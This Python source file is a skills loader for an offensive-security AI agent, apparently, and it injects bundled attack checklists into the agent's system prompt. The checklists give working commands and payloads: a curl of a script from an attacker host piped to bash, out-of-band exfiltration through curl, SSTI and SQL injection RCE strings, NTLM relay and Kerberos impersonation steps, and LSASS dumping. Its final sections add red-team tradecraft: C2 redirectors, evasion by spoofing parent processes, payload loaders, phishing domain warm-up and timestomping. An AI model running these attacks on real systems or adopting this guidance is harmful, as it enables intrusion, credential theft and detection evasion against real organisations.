"""
DSEC Skills Loader — Claude-Red inspired SKILL.md system.

Each domain (HTB, BugBounty, CTF, OSINT, 0day) has structured SKILL.md
files containing offensive methodology checklists. Skills are auto-loaded
based on the active domain and can be manually overridden via /skill.

Skills are stored in ~/.dsec/skills/<name>/SKILL.md and bundled defaults
are shipped in dsec/skills/bundled/.
"""
import os
import re
from pathlib import Path
from typing import Dict, List, Optional, Tuple

# ---------------------------------------------------------------------------
# Paths
# ---------------------------------------------------------------------------

_USER_SKILLS_DIR = Path(os.path.expanduser("~/.dsec/skills"))
_BUNDLED_SKILLS_DIR = Path(__file__).parent / "bundled"

# ---------------------------------------------------------------------------
# Domain → skill mapping (auto-load)
# ---------------------------------------------------------------------------

_DOMAIN_SKILLS: Dict[str, List[str]] = {
    "htb": ["htb-linux", "htb-windows"],
    "bugbounty": ["bugbounty-recon", "offensive-rce"],
    "ctf": ["ctf-web", "ctf-pwn", "ctf-rev", "ctf-crypto"],
    "research": ["0day-research"],
    "programmer": [],
}

# Trigger phrase → skill name mapping for context-aware loading
_TRIGGER_PHRASES: Dict[str, List[str]] = {
    "htb-linux": ["linux", "rustscan", "feroxbuster", "ffuf", "linpeas", "privesc", "suid"],
    "htb-windows": ["windows", "active directory", "ad ", "kerberos", "smb", "bloodhound", "mimikatz"],
    "ctf-web": ["web", "sqli", "xss", "ssrf", "ssti", "lfi", "rfi", "injection"],
    "ctf-pwn": ["pwn", "binary", "exploit", "buffer overflow", "rop", "shellcode", "gdb", "pwntools"],
    "ctf-rev": ["reverse", "reversing", "ida", "ghidra", "disassemble", "decompile"],
    "ctf-crypto": ["crypto", "rsa", "aes", "cipher", "hash", "decrypt"],
    "osint-social": ["osint", "twitter", "telegram", "social media", "recon", "dork"],
    "bugbounty-recon": ["bug bounty", "recon", "subdomain", "nuclei", "burp"],
    "0day-research": ["0day", "zero day", "vulnerability research", "fuzzing", "cve"],
    "offensive-rce": ["rce", "remote code execution", "command injection"],
    # New skills
    "ad-pentest": ["active directory", "ad ", "kerberos", "ldap", "domain controller", "dc", "bloodhound", "rubeus", "mimikatz", "ntlm", "pass the hash"],
    "cloud-security": ["cloud", "aws", "azure", "gcp", "s3", "iam", "lambda", "ec2", "storage", "kubernetes", "cloud pentest"],
    "api-security": ["api", "rest", "graphql", "jwt", "oauth", "idor", "swagger", "openapi", "endpoint", "bearer"],
    "mobile-security": ["mobile", "android", "ios", "apk", "ipa", "frida", "objection", "jadx", "smali", "mobile pentest"],
    "wireless-attacks": ["wifi", "wireless", "wpa", "wpa2", "aircrack", "handshake", "deauth", "evil twin", "monitor mode"],
    "container-k8s": ["docker", "container", "kubernetes", "k8s", "pod", "escape", "container breakout", "helm", "etcd"],
    "phishing-se": ["phishing", "social engineering", "spearphish", "credential harvest", "pretexting", "vishing"],
    "malware-analysis": ["malware", "reverse engineering", "ida", "ghidra", "pe", "elf", "packed", "unpacking", "sandbox", "dynamic analysis"],
    "privesc-windows": ["windows privesc", "winpeas", "potato", "service exploit", "dll hijack", "token", "seimpersonate"],
    "pivoting-tunnel": ["pivot", "tunnel", "port forward", "chisel", "ligolo", "socks", "proxychains", "internal network"],
    "static-analysis": ["code review", "static analysis", "semgrep", "codeql", "sast", "source code", "audit", "vulnerability"],
    "advanced-redteam-ops": ["advanced red team", "red team operations", "opsec", "c2", "redirector", "infrastructure", "persistence", "exfiltration"],
    "ntlm-relay-rbcd": ["ntlm relay", "rbcd", "resource based constrained delegation", "ldap relay", "ntlmrelayx", "impersonate"],
    "initial-access-payloads": ["initial access", "payload", "reverse shell", "bind shell", "phishing", "loader", "fud"],
}


def _skill_dirs() -> List[Path]:
    """Return all directories that may contain skills (user first, then bundled)."""
    dirs = []
    if _USER_SKILLS_DIR.exists():
        dirs.append(_USER_SKILLS_DIR)
    if _BUNDLED_SKILLS_DIR.exists():
        dirs.append(_BUNDLED_SKILLS_DIR)
    return dirs


def list_skills() -> List[Dict[str, str]]:
    """Enumerate all available skills with metadata."""
    seen = set()
    skills = []
    for base_dir in _skill_dirs():
        if not base_dir.exists():
            continue
        for entry in sorted(base_dir.iterdir()):
            skill_file = entry / "SKILL.md" if entry.is_dir() else None
            if skill_file and skill_file.exists() and entry.name not in seen:
                seen.add(entry.name)
                # Extract description from first few lines
                desc = _extract_description(skill_file)
                source = "user" if base_dir == _USER_SKILLS_DIR else "bundled"
                skills.append({
                    "name": entry.name,
                    "description": desc,
                    "source": source,
                    "path": str(skill_file),
                })
    return skills


def load_skill(name: str) -> Optional[str]:
    """Load a skill's SKILL.md content by name. Returns None if not found."""
    for base_dir in _skill_dirs():
        skill_file = base_dir / name / "SKILL.md"
        if skill_file.exists():
            try:
                content = skill_file.read_text(encoding="utf-8")
                # Truncate very long skills to avoid blowing context
                if len(content) > 6000:
                    content = content[:6000] + "\n\n... [skill truncated to save context]"
                return content
            except Exception:
                return None
    return None


def auto_select_skills(domain: str, user_input: str = "") -> List[str]:
    """
    Select skills based on domain + trigger phrase matching.

    Returns list of skill names to load. Domain skills are always included,
    plus any trigger-matched skills from user input.
    """
    selected = set()

    # Always include domain-default skills
    domain_skills = _DOMAIN_SKILLS.get(domain, [])
    selected.update(domain_skills)

    # Trigger phrase matching on user input
    if user_input:
        input_lower = user_input.lower()
        for skill_name, phrases in _TRIGGER_PHRASES.items():
            for phrase in phrases:
                if phrase in input_lower:
                    selected.add(skill_name)
                    break

    # Cap at 3 skills to avoid context explosion
    result = list(selected)[:3]
    return result


def format_skills_context(skill_names: List[str]) -> str:
    """Load and format multiple skills for system prompt injection."""
    if not skill_names:
        return ""

    blocks = ["[ACTIVE SKILLS — Offensive Methodology Checklists]"]
    loaded = 0
    for name in skill_names:
        content = load_skill(name)
        if content:
            blocks.append(f"\n{'═' * 50}")
            blocks.append(f"SKILL: {name}")
            blocks.append(f"{'═' * 50}")
            blocks.append(content)
            loaded += 1

    if loaded == 0:
        return ""

    blocks.append("\n[END ACTIVE SKILLS — Follow these methodologies when applicable]")
    return "\n".join(blocks)


def ensure_bundled_skills() -> None:
    """Create the bundled skills directory with default skills if missing."""
    _BUNDLED_SKILLS_DIR.mkdir(parents=True, exist_ok=True)

    for skill_name, content in _BUNDLED_SKILL_CONTENT.items():
        skill_dir = _BUNDLED_SKILLS_DIR / skill_name
        skill_dir.mkdir(exist_ok=True)
        skill_file = skill_dir / "SKILL.md"
        if not skill_file.exists():
            skill_file.write_text(content, encoding="utf-8")


def _extract_description(skill_file: Path) -> str:
    """Extract the description line from a SKILL.md file."""
    try:
        text = skill_file.read_text(encoding="utf-8")
        for line in text.split("\n"):
            line = line.strip()
            if line.startswith("## Description"):
                continue
            if line and not line.startswith("#") and not line.startswith("-"):
                return line[:120]
        return "(no description)"
    except Exception:
        return "(read error)"


# ---------------------------------------------------------------------------
# Bundled skill content
# ---------------------------------------------------------------------------

_BUNDLED_SKILL_CONTENT: Dict[str, str] = {
    "htb-linux": """# SKILL: HackTheBox Linux Machine

## Description
Systematic methodology for Linux-based HackTheBox machines.

## Trigger Phrases
linux, nmap, linpeas, privesc, suid, cron, ssh, htb

## Methodology

### Phase 1: Reconnaissance
1. Full TCP port scan: `nmap -p- --min-rate 5000 -oN ports.txt <IP>`
2. Service version + scripts: `nmap -sCV -p <ports> -oN services.txt <IP>`
3. UDP quick scan: `nmap -sU --top-ports 20 <IP>`
4. Note OS hints from TTL, service banners

### Phase 2: Enumeration
1. **Web (80/443)**: gobuster/feroxbuster for dirs, check for CMS (WordPress, Joomla), check robots.txt, source code
2. **SMB (445)**: `smbclient -L //<IP>`, `enum4linux -a <IP>`, check null session
3. **FTP (21)**: anonymous login, check for writable dirs
4. **DNS (53)**: zone transfer `dig axfr @<IP> <domain>`
5. **SSH (22)**: banner grab, check for key-based auth

### Phase 3: Exploitation
1. Search for CVEs in identified versions: `searchsploit <service> <version>`
2. Check exploit-db, GitHub PoCs
3. If web app: test for SQLi, LFI/RFI, SSTI, file upload, auth bypass
4. If credentials found: spray across all services
5. If stuck: re-enumerate, check for hidden vhosts/subdomains

### Phase 4: Privilege Escalation
1. Run LinPEAS: `curl http://<attacker>/linpeas.sh | bash`
2. Check SUID binaries: `find / -perm -4000 2>/dev/null` → GTFOBins
3. Check cron jobs: `cat /etc/crontab`, `ls -la /etc/cron.*`
4. Check sudo: `sudo -l`
5. Check writable paths in PATH, writable scripts called by root
6. Check kernel version: `uname -r` → kernel exploits
7. Check capabilities: `getcap -r / 2>/dev/null`
8. Check internal services: `ss -tlnp`, pivot if needed

### Phase 5: Post-Exploitation
1. Grab flags: `cat /home/*/user.txt`, `cat /root/root.txt`
2. Document the full attack chain for writeup
3. Save credentials and CVEs to memory
""",

    "htb-windows": r"""# SKILL: HackTheBox Windows / Active Directory

## Description
Systematic methodology for Windows-based and AD HackTheBox machines.

## Trigger Phrases
windows, active directory, ad, kerberos, smb, bloodhound, mimikatz

## Methodology

### Phase 1: Reconnaissance
1. Full port scan: `nmap -p- --min-rate 5000 -oN ports.txt <IP>`
2. Service scan: `nmap -sCV -p <ports> -oN services.txt <IP>`
3. Note domain name from LDAP/SMB banners

### Phase 2: Enumeration
1. **SMB**: `crackmapexec smb <IP>`, `smbmap -H <IP>`, `smbclient -L //<IP>`
2. **LDAP**: `ldapsearch -x -H ldap://<IP> -b "DC=domain,DC=local"`
3. **RPC**: `rpcclient -U '' <IP>`, `enumdomusers`, `enumdomgroups`
4. **Kerberos**: `kerbrute userenum --dc <IP> -d <domain> users.txt`
5. **Web**: IIS, ADFS, OWA — check for auth bypass, default creds
6. **DNS**: zone transfer, subdomain enum

### Phase 3: Initial Access
1. AS-REP Roasting: `GetNPUsers.py <domain>/ -dc-ip <IP> -no-pass -usersfile users.txt`
2. Kerberoasting: `GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <IP> -request`
3. Password spraying: `crackmapexec smb <IP> -u users.txt -p passwords.txt`
4. Check for known CVEs (EternalBlue, PrintNightmare, ZeroLogon)
5. If web: exploit web vulnerabilities for initial shell

### Phase 4: Privilege Escalation
1. WinPEAS: `.\winpeas.exe`
2. PowerUp: `Invoke-AllChecks`
3. Check services: unquoted paths, weak permissions
4. Check scheduled tasks, registry autoruns
5. Token impersonation: `whoami /priv` → potato attacks
6. AD: BloodHound → find shortest path to DA

### Phase 5: Lateral Movement & Domain Compromise
1. Pass-the-Hash: `crackmapexec smb <IP> -u <user> -H <hash>`
2. DCSync: `secretsdump.py <domain>/<admin>@<DC-IP>`
3. Golden Ticket, Silver Ticket if needed
4. Dump LSASS: `mimikatz` → `sekurlsa::logonpasswords`
""",

    "ctf-web": """# SKILL: CTF Web Exploitation

## Description
Web exploitation checklist for CTF challenges.

## Trigger Phrases
web, sqli, xss, ssrf, ssti, lfi, rfi, injection, ctf

## Methodology

### Quick Wins
1. Check source code, comments, hidden fields
2. Check robots.txt, .git/, .env, backup files (.bak, .old, ~)
3. Try default credentials (admin:admin, admin:password)
4. Check cookies for JWT, base64 encoded data

### SQL Injection
1. Test: `' OR 1=1--`, `" OR 1=1--`, `') OR 1=1--`
2. Union-based: determine column count with ORDER BY
3. Extract data: `UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--`
4. Blind SQLi: time-based `' AND SLEEP(5)--`
5. SQLMap: `sqlmap -u "<url>" --batch --dbs`

### Server-Side Template Injection
1. Test: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`
2. Identify engine from error messages
3. Jinja2 RCE: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`
4. Twig, Freemarker, Pebble → engine-specific payloads

### Local File Inclusion
1. Test: `?file=../../../../etc/passwd`
2. PHP wrappers: `php://filter/convert.base64-encode/resource=index.php`
3. Log poisoning: inject PHP into access log, include it
4. Null byte: `%00` (older PHP)

### Deserialization
1. PHP: check for `unserialize()` → craft gadget chain
2. Python pickle: `pickle.loads()` → RCE via __reduce__
3. Java: ysoserial gadgets
""",

    "ctf-pwn": """# SKILL: CTF Binary Exploitation (Pwn)

## Description
Binary exploitation methodology for CTF challenges.

## Trigger Phrases
pwn, binary, exploit, buffer overflow, rop, shellcode, gdb, pwntools

## Methodology

### Initial Analysis
1. `file <binary>` — architecture, linking, stripped?
2. `checksec <binary>` — NX, PIE, canary, RELRO
3. `strings <binary>` — interesting strings, format strings
4. Open in Ghidra/IDA — find main, vulnerable functions

### Stack Buffer Overflow
1. Find overflow: pattern create → crash → pattern offset
2. Control EIP/RIP: overwrite return address
3. NX disabled → shellcode on stack, jump to it
4. NX enabled → ROP chain: `ROPgadget --binary <file>`
5. ret2libc: leak libc address → system("/bin/sh")

### Format String
1. Test: `%x %x %x %x` — leaks stack values
2. Read: `%n$s` — read from arbitrary address
3. Write: `%n` — write to arbitrary address (GOT overwrite)

### Heap Exploitation
1. Use-after-free, double-free, heap overflow
2. Tcache poisoning (glibc 2.26+): overwrite fd pointer
3. Fastbin dup, unsorted bin attack

### Tools
- pwntools: `from pwn import *`
- GDB + pwndbg/GEF
- ROPgadget, one_gadget
- LibcSearcher for remote libc identification
""",

    "ctf-rev": """# SKILL: CTF Reverse Engineering

## Description
Reverse engineering workflow for CTF challenges.

## Trigger Phrases
reverse, reversing, ida, ghidra, disassemble, decompile

## Methodology

### Static Analysis
1. `file <binary>` — identify format
2. `strings -n 8 <binary>` — look for flag format, passwords
3. Open in Ghidra — decompile main, follow logic
4. Identify: encryption, encoding, anti-debug, obfuscation

### Dynamic Analysis
1. `ltrace ./binary` — library call trace
2. `strace ./binary` — system call trace
3. GDB: breakpoints at key comparisons
4. `angr` for symbolic execution on complex checks

### Common Patterns
- XOR cipher with known key → brute force key byte-by-byte
- Custom hash → z3 SMT solver
- VM-based obfuscation → trace opcode handlers
- Anti-debug: ptrace check, timing checks → patch or LD_PRELOAD
""",

    "ctf-crypto": """# SKILL: CTF Cryptography

## Description
Crypto challenge patterns and attack methodologies.

## Trigger Phrases
crypto, rsa, aes, cipher, hash, decrypt, modular

## Methodology

### RSA Attacks
1. Small e with small message → cube root attack
2. Common modulus attack (same n, different e)
3. Wiener's attack (large e, small d)
4. Factorize n: factordb.com, yafu, msieve
5. Coppersmith short pad attack
6. Hastad broadcast attack (same m, multiple (n,e) pairs)

### AES / Block Cipher
1. ECB mode → detect patterns, block reordering
2. CBC bit-flipping → modify ciphertext to alter plaintext
3. Padding oracle → decrypt without key
4. Key reuse → XOR ciphertexts

### Classical Ciphers
1. Caesar/ROT13: `python3 -c "import codecs; print(codecs.decode(s, 'rot_13'))"`
2. Vigenère: Kasiski analysis, frequency analysis
3. Substitution: quipqiup.com

### Hash
1. Length extension attack (MD5, SHA1)
2. Hash collision (birthday attack)
3. Rainbow tables: crackstation.net
""",

    "osint-social": """# SKILL: OSINT Social Media Crawling

## Description
API-less social media OSINT with ReAct methodology for deep understanding.

## Trigger Phrases
osint, twitter, telegram, social media, recon, dork, mastodon

## Methodology

### Twitter/X (API-less via Nitter)
1. Use `osint_crawl_twitter` tool with targeted queries
2. Search operators: `from:user`, `to:user`, `since:2024-01-01`, `filter:links`
3. ReAct: Don't just read — ANALYZE sentiment, connections, timeline patterns
4. Follow reply chains for context
5. Cross-reference usernames across platforms

### Telegram (API-less via t.me/s/)
1. Use `osint_crawl_telegram` tool for public channels
2. Key infosec channels: vx-underground, darknet intelligence, exploit alerts
3. Track forwarded messages to find original sources
4. Monitor for IOCs, leaked credentials, exploit announcements

### Google Dorking
1. `site:target.com filetype:pdf|doc|xls`
2. `inurl:admin|login|dashboard site:target.com`
3. `"password" | "secret" | "api_key" filetype:env|json|yaml`
4. Use `web_search` tool with dork queries

### Infosec News
1. Monitor: The Hacker News, BleepingComputer, Krebs on Security
2. CVE tracking: nvd.nist.gov, cvedetails.com
3. Exploit tracking: exploit-db.com, PacketStorm
""",

    "bugbounty-recon": """# SKILL: Bug Bounty Reconnaissance & Exploitation

## Description
Bug bounty recon-to-exploitation methodology with noise management.

## Trigger Phrases
bug bounty, recon, subdomain, nuclei, burp, scope

## Methodology

### Phase 1: Scope & Recon
1. Define scope: domains, IPs, out-of-scope
2. Subdomain enum: `subfinder -d target.com -all -o subs.txt`
3. Live hosts: `httpx -l subs.txt -o live.txt`
4. Screenshot: `gowitness file -f live.txt`
5. Tech stack: `whatweb`, Wappalyzer

### Phase 2: Content Discovery
1. Dir brute: `feroxbuster -u https://target.com -w wordlist.txt`
2. JS analysis: `linkfinder -i https://target.com/app.js -o cli`
3. Parameter discovery: `arjun -u https://target.com/api/`
4. API endpoints: check /api/, /graphql, /swagger, /openapi.json

### Phase 3: Vulnerability Testing
1. Run nuclei: `nuclei -l live.txt -t nuclei-templates/ -severity critical,high`
2. Test auth: IDOR, broken access control, privilege escalation
3. Test input: SQLi, XSS, SSRF, SSTI, command injection
4. Business logic: rate limiting, race conditions, price manipulation

### Noise Management
- Keep detailed notes of every test → avoid re-testing
- Use graph_memory_insert to track tested endpoints
- If stuck on one approach, pivot to different attack surface
- Don't overthink — move to next target after reasonable effort
""",

    "0day-research": """# SKILL: 0-Day Vulnerability Research

## Description
Methodology for discovering novel vulnerabilities in software.

## Trigger Phrases
0day, zero day, vulnerability research, fuzzing, cve, patch diffing

## Methodology

### Target Selection
1. Identify widely-used software with complex input parsing
2. Check recent patches — are there patterns of similar bugs?
3. Focus on: parsers, deserializers, auth logic, file handlers

### Code Auditing
1. Use `programmer_search` to find dangerous patterns:
   - C/C++: strcpy, sprintf, memcpy without bounds, use-after-free patterns
   - Python: eval, exec, pickle.loads, subprocess with shell=True
   - PHP: unserialize, include with user input, preg_replace with /e
   - Java: Runtime.exec, ObjectInputStream, JNDI lookup
2. Trace user input from entry point to dangerous sink
3. Check for integer overflows, type confusion, race conditions

### Fuzzing
1. Coverage-guided: AFL++, libFuzzer
2. Grammar-based: for complex formats (PDF, HTTP, SQL)
3. Mutation-based: for binary formats
4. Monitor: ASAN, MSAN, UBSAN for memory bugs

### Patch Diffing
1. Compare vulnerable vs patched versions: `diff`, BinDiff
2. Identify the fix — what was the root cause?
3. Check: is the fix complete? Are there variant bugs?
4. Look for similar patterns in other code paths

### Research Documentation
1. Use memory tools to save every finding
2. Build attack chain: trigger → control → impact
3. Write PoC: minimal reproducer
4. Calculate CVSS score, determine impact
""",

    "offensive-rce": """# SKILL: Remote Code Execution Testing

## Description
RCE testing checklist adapted from Claude-Red / SnailSploit.

## Trigger Phrases
rce, remote code execution, command injection, os injection

## Methodology

### OS Command Injection
1. Identify user input reaching system commands
2. Test separators: `;`, `|`, `||`, `&&`, `\\n`, `` ` ``
3. Blind detection: `; sleep 5`, `| ping -c 5 <attacker>`
4. Out-of-band: `; curl http://<attacker>/$(whoami)`
5. Bypass filters: `${IFS}`, `$()`, `\\x0a`, encoding

### SSTI to RCE
1. Test template markers: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`
2. Jinja2: `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`
3. Twig: `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`

### Deserialization RCE
1. Java: ysoserial → CommonsCollections, Spring gadgets
2. PHP: unserialize + POP chains
3. Python: pickle → `__reduce__` method
4. .NET: ysoserial.net, TypeNameHandling

### File Upload to RCE
1. Upload webshell: bypass extension filters (.pHp, .php5, .phtml)
2. Content-Type manipulation
3. Double extension: shell.php.jpg
4. Polyglot files: valid image + valid PHP
""",

    "advanced-redteam-ops": """# SKILL: Advanced Redteam Ops
## Description
OPSEC discipline, C2 infrastructure, and advanced LOTL techniques.
## Trigger Phrases
advanced red team, red team operations, opsec, c2
## Methodology
### Redirectors & C2
1. Teamserver should ONLY bind to 127.0.0.1.
2. Use websocat/cloudflared to tunnel traffic through Cloudflare/WS.
3. Malleable Profiles: Disable staging, mimic real traffic (Azure/Teams), enable sleep_mask.
### Infrastructure Segregation
- Tier 1: Phishing (short-lived).
- Tier 2: Interactive C2 (short-haul).
- Tier 3: Persistence (long-haul, low and slow).
### OPSEC
- Avoid noisy parents (winword.exe spawning powershell).
- Spoof 3 generations of process parents if possible.
- Jitter and Sleep: Never use 0 sleep. Use high jitter (30-40%).
""",

    "ntlm-relay-rbcd": """# SKILL: NTLM Relay to RBCD
## Description
Abusing Resource Based Constrained Delegation via NTLM Relay for Domain Escalation.
## Trigger Phrases
ntlm relay, rbcd, ldap relay, impersonate
## Methodology
1. Identify target Computer account (e.g., DC01$).
2. Identify a computer we control or can create (e.g., FAKE01$).
3. Run ntlmrelayx.py:
   `ntlmrelayx.py -t ldap://<DC_IP> --delegate-access --escalate-user FAKE01$ -wh attacker-lw.com`
4. Coerce authentication from target (DC01$) to our relay (e.g., PetitPotam, PrinterBug).
5. Relay succeeds -> ntlmrelayx sets `msDS-AllowedToActOnBehalfOfOtherIdentity`.
6. Impersonate:
   `getST.py -spn cifs/DC01.domain.local 'domain/FAKE01$ password' -impersonate Administrator`
7. Export ticket and access:
   `export KRB5CCNAME=Administrator.ccache; psexec.py -k -no-pass DC01.domain.local`
""",

    "initial-access-payloads": """# SKILL: Initial Access & Payloads
## Description
Methodology for generating and delivering initial access payloads.
## Trigger Phrases
initial access, payload, reverse shell, loader
## Methodology
### Payload Generation
1. Use `dsec_generate_payload` for quick commands.
2. For loaders: Keep it <30kb, avoid .exe (use .js, .vbs, .hta, .hlp).
3. Evasion: Use LOLBins like `certutil`, `bitsadmin`, `curl` for downloading second stage.
### Delivery
1. Phishing: Warm up domain for 2 weeks.
2. Mimic legitimate file names and timestamps (timestomp).
3. If using HTTP, filter by User-Agent to avoid scanners.
""",
}
